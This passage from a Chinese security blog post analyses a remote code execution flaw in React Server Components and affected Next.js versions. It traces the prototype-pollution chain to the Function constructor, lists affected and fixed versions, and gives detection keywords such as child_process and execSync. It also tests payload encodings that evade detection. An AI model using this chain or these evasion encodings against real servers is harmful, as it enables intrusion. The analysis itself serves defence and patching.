</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>Chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>then</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>	<span class=nx>initializeModelChunk</span><span class=p>(</span><span class=nx>Chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>		<span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>		<span class=nx>reviveModel</span><span class=p>()</span> <span class=c1>// 遍历 Chunk[0].value，第一个元素是 &#34;then&#34;: &#34;$1:__proto__:then&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=s2>&#34;then&#34;</span><span class=o>:</span> <span class=s2>&#34;$1:__proto__:then&#34;</span> <span class=p>=&gt;</span>
</span></span><span class=line><span class=cl>			<span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>			<span class=nx>parseModelString</span><span class=p>()</span> <span class=c1>// 校验、解析 $B、$@ 等开头的各类字符串对象
</span></span></span><span class=line><span class=cl><span class=c1></span>				<span class=s2>&#34;$1:__proto__:then&#34;</span> <span class=p>=&gt;</span> <span class=s2>&#34;1:__proto__:then&#34;</span> <span class=p>=&gt;</span>
</span></span><span class=line><span class=cl>				<span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>			  <span class=nx>getOutlineModel</span><span class=p>()</span> 
</span></span><span class=line><span class=cl>					<span class=s2>&#34;1:__proto__:then&#34;</span> <span class=p>=&gt;</span> <span class=p>[</span><span class=s2>&#34;1&#34;</span><span class=p>,</span> <span class=s2>&#34;__proto__&#34;</span><span class=p>,</span> <span class=s2>&#34;then&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>					<span class=s2>&#34;1&#34;</span> <span class=p>=&gt;</span> <span class=nx>getChunk</span><span class=p>()</span> <span class=p>=&gt;</span> <span class=nx>Chunk</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> 
</span></span><span class=line><span class=cl>					<span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>					<span class=nx>initializeModelChunk</span><span class=p>(</span><span class=nx>Chunk</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>						<span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>								<span class=nx>reviveModel</span><span class=p>()</span> <span class=c1>// Chunk[1].value是字符串：&#34;$@abc&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>									<span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>									<span class=nx>parseModelString</span><span class=p>()</span> <span class=c1>// 校验 $B、$@ 等开头的各类字符串对象
</span></span></span><span class=line><span class=cl><span class=c1></span>										<span class=s2>&#34;$@abc&#34;</span> <span class=p>=&gt;</span> <span class=nx>getChunk</span><span class=p>(...,</span> <span class=nb>parseInt</span><span class=p>(</span><span class=s2>&#34;abc&#34;</span><span class=p>,</span> <span class=mi>16</span><span class=p>))</span> <span class=p>=&gt;</span> <span class=nx>Chunk</span><span class=p>[</span><span class=mi>2748</span><span class=p>]</span>
</span></span><span class=line><span class=cl>						<span class=nx>Chunk</span><span class=p>[</span><span class=mi>1</span><span class=p>].</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>Chunk</span><span class=p>[</span><span class=mi>2748</span><span class=p>]</span>
</span></span><span class=line><span class=cl>					<span class=s2>&#34;__proto__&#34;</span> <span class=p>=&gt;</span> <span class=nx>Chunk</span><span class=p>[</span><span class=mi>2748</span><span class=p>].</span><span class=nx>__proto__</span>
</span></span><span class=line><span class=cl>					<span class=s2>&#34;then&#34;</span> <span class=p>=&gt;</span> <span class=nx>Chunk</span><span class=p>[</span><span class=mi>2748</span><span class=p>].</span><span class=nx>__proto__</span><span class=p>.</span><span class=nx>then</span>
</span></span><span class=line><span class=cl>					<span class=nx>Chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=p>.</span><span class=nx>then</span> <span class=o>=</span> <span class=nx>Chunk</span><span class=p>[</span><span class=mi>2748</span><span class=p>].</span><span class=nx>__proto__</span><span class=p>.</span><span class=nx>then</span>
</span></span></code></pre></td></tr></table></div></div><p>至此，<code>Chunk[0].value.then</code> 的值就变为了 Chunk 函数的原型对象的 then 属性，一个 React 自定义匿名函数。</p><ul><li><code>"$@abc"</code> 只需要满足以 <code>$@</code> 开头，后半段可以按照十六进制解析为数字即可</li><li><code>"$@"</code>：原始 Chunk 引用</li></ul><h3 id=43-获取构造函数>4.3 获取构造函数</h3><p>继续遍历 <code>Chunk[0].value</code> 剩下的元素，基本是同样的方式获取函数构造器 <code>[Function: Function]</code>并赋值给<code>Chunk[0].value._response._formData.get</code> 。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl>			<span class=s2>&#34;status&#34;</span><span class=p>,</span> <span class=s2>&#34;reason&#34;</span><span class=p>,</span> <span class=s2>&#34;value&#34;</span><span class=p>...</span> <span class=c1>// 非$开头的普通字符串或 Int，直接返回
</span></span></span><span class=line><span class=cl><span class=c1></span>    	<span class=s2>&#34;_response&#34;</span><span class=o>:</span> <span class=p>{}</span> <span class=p>=&gt;</span> 
</span></span><span class=line><span class=cl>      <span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>      <span class=nx>reviveModel</span><span class=p>()</span> <span class=c1>// 遍历 Chunk[0].value._response
</span></span></span><span class=line><span class=cl><span class=c1></span>				<span class=s2>&#34;_prefix&#34;</span><span class=o>:</span> <span class=s2>&#34;eval_code&#34;</span>   <span class=c1>// 非$开头的普通字符串，直接返回
</span></span></span><span class=line><span class=cl><span class=c1></span>				<span class=s2>&#34;_formData&#34;</span><span class=o>:</span> <span class=p>{}</span>	<span class=p>=&gt;</span>
</span></span><span class=line><span class=cl>        <span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>      	<span class=nx>reviveModel</span><span class=p>()</span> <span class=c1>// 遍历 Chunk[0].value._response._formData
</span></span></span><span class=line><span class=cl><span class=c1></span>					<span class=s2>&#34;get&#34;</span><span class=o>:</span> <span class=s2>&#34;$1:constructor:constructor&#34;</span> <span class=p>=&gt;</span>
</span></span><span class=line><span class=cl>          <span class=nx>parseModelString</span><span class=p>()</span>
</span></span><span class=line><span class=cl>          	<span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>						<span class=nx>getOutlinedModel</span><span class=p>()</span>
</span></span><span class=line><span class=cl>							<span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;1&#34;</span> <span class=p>=&gt;</span> <span class=nx>getChunk</span><span class=p>()</span> <span class=p>=&gt;</span> <span class=nx>Chunk</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>							<span class=s2>&#34;constructor&#34;</span> <span class=p>=&gt;</span> <span class=nx>Chunk</span><span class=p>[</span><span class=mi>2748</span><span class=p>].</span><span class=nx>constructor</span>
</span></span><span class=line><span class=cl>							<span class=s2>&#34;constructor&#34;</span> <span class=p>=&gt;</span> <span class=nx>Chunk</span><span class=p>[</span><span class=mi>2748</span><span class=p>].</span><span class=nx>constructor</span><span class=p>.</span><span class=nx>constructor</span>
</span></span><span class=line><span class=cl>							<span class=nx>Chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=p>.</span><span class=nx>_response</span><span class=p>.</span><span class=nx>_formData</span><span class=p>.</span><span class=nx>get</span> <span class=o>=</span> <span class=p>[</span><span class=nb>Function</span><span class=o>:</span> <span class=nb>Function</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>到此完成了假 Chunk 的伪造——<code>Chunk[0].value</code>。</p><h3 id=44-调用恶意函数>4.4 调用恶意函数</h3><p>遍历完 <code>Chunk[0].value</code>所有元素之后， <code>reviveModel()</code>函数结束，回到 <code>initializeModelChunk()</code> 函数，<code>Chunk[0].status</code> 的值修改为 “fulfilled”，然后回到 <code>Chunk[0].then()</code>。</p><p><code>Chunk[0].then()</code> 执行 <code>resolve(Chunk[0].value) </code>，进入 <code>Chunk[0].value.then()</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Chunk[0].status = &#34;fulfilled&#34; =&gt; resolve(Chunk[0].value) 
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>Chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=p>.</span><span class=nx>then</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>  <span class=nx>initializeModelChunk</span><span class=p>(</span><span class=nx>Chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>Chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;{&#34;</span><span class=nx>then</span><span class=s2>&#34;: &#34;</span><span class=nx>$B</span><span class=s2>&#34;}&#34;</span> <span class=p>=&gt;</span> <span class=p>{</span><span class=nx>then</span><span class=o>:</span> <span class=s2>&#34;$B&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>    <span class=nx>reviveModel</span><span class=p>(...,</span> <span class=p>{</span><span class=nx>then</span><span class=o>:</span> <span class=s2>&#34;$B&#34;</span><span class=p>},...)</span>
</span></span><span class=line><span class=cl>			<span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>      <span class=nx>reviveModel</span><span class=p>(...,</span> <span class=s2>&#34;$B&#34;</span><span class=p>,...)</span>
</span></span><span class=line><span class=cl>				<span class=err>↓↓↓</span>
</span></span><span class=line><span class=cl>        <span class=nx>parseModelString</span><span class=p>(...,</span> <span class=s2>&#34;$B&#34;</span><span class=p>,...)</span>
</span></span><span class=line><span class=cl>					<span class=k>case</span> <span class=s2>&#34;$&#34;</span> <span class=p>=&gt;</span> <span class=k>case</span> <span class=s2>&#34;B&#34;</span> <span class=p>=&gt;</span> 
</span></span><span class=line><span class=cl>					<span class=k>return</span> <span class=nx>Chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=p>.</span><span class=nx>_response</span><span class=p>.</span><span class=nx>_formData</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>Chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=p>.</span><span class=nx>_response</span><span class=p>.</span><span class=nx>_prefix</span> <span class=o>+</span> <span class=nb>parseInt</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=mi>16</span><span class=p>))</span> 
</span></span><span class=line><span class=cl>		<span class=nx>Chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=p>.</span><span class=nx>status</span> <span class=o>=</span> <span class=s2>&#34;fulfilled&#34;</span>
</span></span><span class=line><span class=cl>		<span class=nx>Chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=p>.</span><span class=nx>value</span><span class=p>.</span><span class=nx>then</span> <span class=o>=</span> <span class=nb>Function</span><span class=p>{</span><span class=nx>eval_code</span><span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>resolve</span><span class=p>(</span><span class=nx>Chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=p>.</span><span class=nx>value</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=nx>Chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=p>.</span><span class=nx>value</span><span class=p>.</span><span class=nx>then</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><ul><li><code>"$B"</code> ：Blob 对象引用；<code>"$B"</code>后的字符串内容无所谓，满足可以按照十六进制解析即可。</li><li>针对真实 Chunk 来获取 formData 的操作被 <code>"Chunk[0].value._response._formData.get"</code> 覆盖，实际调用的是函数构造器 <code>[Function: Function]</code></li><li>函数构造器的参数是指定的恶意代码；真实 Chunk 的<code>_response._prefix</code> 值是一个空字符串 <code>""</code></li><li><code>resolve(Chunk[0].value.value) </code>=> <code>Chunk[0].value.value.then()</code></li></ul><h2 id=0x05-影响范围>0x05 影响范围</h2><p><strong>影响版本：</strong></p><ul><li>React Server 19.0.0</li><li>React Server 19.0.1 (注：部分早期补丁未完全覆盖)</li><li>React Server 19.1.*</li><li>React Server 19.2.0</li></ul><p><strong>其他受影响组件/应用：</strong></p><ul><li>Next.js v15.0.0 - v15.0.4</li><li>Next.js v15.1.0 - v15.1.8</li><li>Next.js v15.2.x - v15.5.6</li><li>Next.js v16.0.0 - v16.0.6</li><li>Next.js v14.3.0-canary.77 及以上 Canary 版本</li><li>Dify、NextChat 等通用产品</li></ul><p><strong>修复版本：</strong></p><ul><li>React: 19.0.1+, 19.1.2+, 19.2.1+</li><li>Next.js: 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7+</li></ul><h2 id=0x06-检测与绕过>0x06 检测与绕过</h2><h3 id=61-可检测特征>6.1 可检测特征</h3><p><strong>对象属性/固定特征：</strong></p><ul><li>POST 请求方法</li><li>&ldquo;then&rdquo;，&ldquo;status&rdquo;，&ldquo;reason&rdquo;，"_response"，"_prefix"，"_formData"</li><li>__proto__:then，constructor:constructor</li><li>$B，$@</li></ul><p><strong>常用恶意payload特征：</strong></p><ul><li>process.mainModule.require</li><li>child_process</li><li>execSync / exec / spawn / spawnSync / execFileSync</li><li>fs.readFileSync / fs.writeFileSync</li><li>vm.runInThisContext / vm.runInNewContext</li></ul><h3 id=62-攻击结果检测>6.2 攻击结果检测</h3><p>由于最后执行代码是通过链式调用 thenable 对象的 then 方法，当前对象返回的 status 由攻击者控制，整体响应由实际的应用环境封装控制，所以：</p><ul><li>如果有回显，可以校验响应内容来判断常规命令执行的结果</li><li>攻击成功不一定返回 positive 响应；negative 响应不一定表示攻击失败</li><li>没有响应(阻塞)不一定表示攻击失败</li></ul><h3 id=63-payload-绕过>6.3 payload 绕过</h3><p><strong>✅ Unicode 编码</strong></p><p>如：<code>child_process</code> = > <code>\u0063\u0068\u0069\u006C\u0064\u005F\u0070\u0072\u006F\u0063\u0065\u0073\u0073</code></p><p>在构造假 Chunk 的 JSON 数据部分，不区分键名/键值，所有字符串都可以进行 Unicode 编码，不影响解析。</p><p>不过不支持 Java 中常见的如 <code>\uuu0063</code> 等变种。</p><p><strong>✅ 十六进制编码</strong></p><p>如：<code>child_process</code> => <code>\x63hild_process</code></p><p>可行，但仅限在 <code>_response._prefix</code> 的恶意代码的语句参数部分，语句本身不行；固定的 JSON 键值对内容不行。</p><p><strong>✅ String.fromCharCode()</strong></p><p>如：<code>'child_process'</code> => <code>'child_' + String.fromCharCode(112,114,111,99,101,115,115)</code></p><p>可行，但仅限在 <code>_response._prefix</code> 的恶意代码的语句参数部分，语句本身不行；固定的 JSON 键值对内容不行。</p><p>可知，以下变种也可：</p><p><code>'child_process'</code> => <code>'child_' + String.fromCharCode(0o160, 0o162, 0o157, 0o143, 0o145, 0o163, 0o163)</code></p><p><code>'child_process'</code> => <code>'child_' + String.fromCharCode(0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73)</code></p><p><code>'child_process'</code> => <code>'child_' + String.fromCharCode(0b1110000, 0b1110010, 0b1101111, 0b1100011, 0b1100101, 0b1110011, 0b1110011)</code></p><p><code>'child_process'</code> => <code>'child_' + String.fromCharCode(112, 114, 0o157, 0O143, 0x65, 0x73, 0b1110011)</code></p><p><code>String.fromCharCode(112, 114, ...) </code>=> <code>const abc = String.fromCharCode; abc(112, 114, ...)</code></p><p><strong>✅ 字符集</strong></p><p>请求数据由 busboy 进行处理，busboy 支持提取不同的字符集进行对应解码，如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;0&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;then&#34;:&#34;$1:__proto__:then&#34;...constructor&#34;}}}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>↓↓↓
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;0&#34;
</span></span><span class=line><span class=cl>Content-Type: text/plane;charset=utf16le
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{.&#34;.t.h.e.n.&#34;.:.&#34;.$.1.:._._.p.r.o.t.o._._.:.t.h.e.n.&#34;....c.o.n.s.t.r.u.c.t.o.r.&#34;.}.}.}.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// . =&gt; \x00
</span></span></code></pre></td></tr></table></div></div><p><strong>❌ URL 编码</strong></p><p>实测不论是 JSON 键值对内容，还是 <code>_response._prefix</code> 的恶意代码部分，URL 编码后解析都会报错。</p><p><strong>❌ 大小写</strong></p><p>实测不行，JS 大小写敏感。</p><p><strong>❌ 插入特殊字符</strong></p><p>在 payload 中插入<code>\t\n</code>等空白字符或不可见字符，如：
<code>constructor:constructor</code> => <code>constructor : constructor</code>
<code>constructor:constructor</code> => <code>constructor\t:\tconstructor</code>
<code>constructor:constructor</code> => <code>constructor\n:\nconstructor</code></p><p>实测不行。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/cves/>CVEs</a>
<a href=/tags/react/>React</a></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/aj-report-validationrules%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90cve-2024-7314/><div class=article-details><h2 class=article-title>AJ-Report validationRules参数远程代码执行漏洞分析(CVE-2024-7314)</h2></div></a></article><article><a href=/p/javascript-%E5%8E%9F%E5%9E%8B%E7%BB%A7%E6%89%BF/><div class=article-details><h2 class=article-title>JavaScript 原型继承</h2></div></a></article><article class=has-image><a href=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc5%E9%93%BE/><div class=article-image><img src=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc5%E9%93%BE/%E5%B0%8F%E7%BB%BF.bb86ab301afb08d9df2ba91cf3024f3b_hu_633b5595c185ed86.jpg width=250 height=150 loading=lazy alt="Featured image of post Java反序列化CC5链" data-hash="md5-u4arMBr7CNnfK6kc8wJPOw=="></div><div class=article-details><h2 class=article-title>Java反序列化CC5链</h2></div></a></article><article class=has-image><a href=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc4%E9%93%BE/><div class=article-image><img src=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc4%E9%93%BE/wlwz.989ad42c219de2dc54553b59a51d0780_hu_eb5bdb78cf8dc2f8.jpg width=250 height=150 loading=lazy alt="Featured image of post Java反序列化CC4链" data-hash="md5-mJrULCGd4txUVTtZpR0HgA=="></div><div class=article-details><h2 class=article-title>Java反序列化CC4链</h2></div></a></article><article class=has-image><a href=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc3%E9%93%BE/><div class=article-image><img src=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc3%E9%93%BE/cx.c95681bdcae441ff61c8196eaad7764e_hu_cbcab9c6efb3d857.jpeg width=250 height=150 loading=lazy alt="Featured image of post Java反序列化CC3链" data-hash="md5-yVaBvcrkQf9hyBluqtd2Tg=="></div><div class=article-details><h2 class=article-title>Java反序列化CC3链</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2025 B5juan's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>